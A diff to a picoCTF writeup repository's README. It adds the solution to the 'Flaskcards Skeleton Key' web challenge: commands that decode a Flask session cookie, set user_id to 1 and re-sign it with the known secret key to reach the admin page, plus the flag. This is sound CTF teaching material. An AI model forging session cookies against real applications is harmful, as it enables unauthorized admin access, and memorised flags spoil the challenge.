@@ -96,6 +96,7 @@ Title                                                                      | Cat
 [script me                   ](#general-skills-500-script-me)              | General          | 500    |
 [LoadSomeBits                ](#forensics-550-loadsomebits)                | Forensics        | 550    | `picoCTF{st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_882756901}`
 [assembly-4                  ](#reversing-550-assembly-4)                  | Reversing        | 550    | `picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_94698637}`
+[Flaskcards Skeleton Key     ](#web-exploitation-600-flaskcards-skeleton-key)| Web            | 600    | `picoCTF{1_id_to_rule_them_all_d77c1ed6} `
 [Help Me Reset               ](#web-exploitation-600-help-me-reset)        | Web              | 600    | `picoCTF{i_thought_i_could_remember_those_34745314}`
 [special-pw                  ](#reversing-600-special-pw)                  | Reversing        | 600    |
 [Super Safe RSA 3            ](#cryptography-600-super-safe-rsa-3)         | Crypto           | 600    | `picoCTF{p_&_q_n0_r_$_t!!_6629910}`
@@ -4741,11 +4742,31 @@ https://www.kirsle.net/wizards/flask-session.cgi
 https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key#22463969
 
 
-tested some stuff in [flaskcards_skeleton_key.py](writeupfiles/flaskcards_skeleton_key.py)
+We find [this tool](https://github.com/noraj/flask-session-cookie-manager) to help us (also in this repo [here](writeupfiles/flask_session_cookie_manager.py))
+
+We decode our existing cookie:
+
+```bash
+$ python flask_session_cookie_manager.py decode -c '.eJwlj8uKwzAMAP_F5xxsvSL3Z4JsSWwp7ELSnkr_vYa9z8DMuxx5xvVTbs_zFVs57l5uxRwDe6Vahcl2Ms0KXMUoh6I7IgE0HcSufYoKx0DHXcOYwKlPlkRAi-GZqYCcjEkBOVO7GUwOttaWbHtomzarTfLWxapj2cq8zjyef4_4XT0LVhBpwIyqMnqb3HRXRKUBoqQ-Vkwu73XF-T_Ravl8Aa_JPmw.DrIbMQ.mLvNGriozmsC4ufO9lqGP44D340
+'
+{"_fresh":true,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"10"}
+```
+
+Then change the `user_id` to `1` and encode using our secret key:
+
+```bash
+$ python flask_session_cookie_manager.py encode -s '385c16dd09098b011d0086f9e218a0a2' -t '{"_fresh":True,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"1"}'
+.eJxNUM-LgkAU_leWOXdIVy9Ch2BmxeC9wRiTNxdhzcyn04IV5UT_-1qHZQ_f5YPv50NUh7E5H0VyGa_NQlTdXiQP8fEtEkFl7q2BGGR-A0kBpupzRmR5PaFZh2S2jrj1Ns09-HwCVhFxHljZxuQpQt4NxNiDryNbqgDlpkc5MBrrwGeeyl1nU-sstxP4nUODDtNisg6dlsORzIaxLAIy6q5LmPP2g5ZfTCXcZiytVDE6dbMSVuK5EPV5PFSXn745_U14ybXMQmQ1Vy68lm1I3N_JF3ct6wg8RJhmE3K71Om2e9dvV2-767kZ_98B-Yt__gJ85WQf.W9GuEQ.aDVMvmgmVLaXgfOrCbP6QnJCppQ
+```
+
+we set our cookie and find the flag on the admin page:
+
+![](writeupfiles/flaskcards_admin.png)
+
 
 **Flag**
 ```
-
+picoCTF{1_id_to_rule_them_all_d77c1ed6}
 ```
 
 
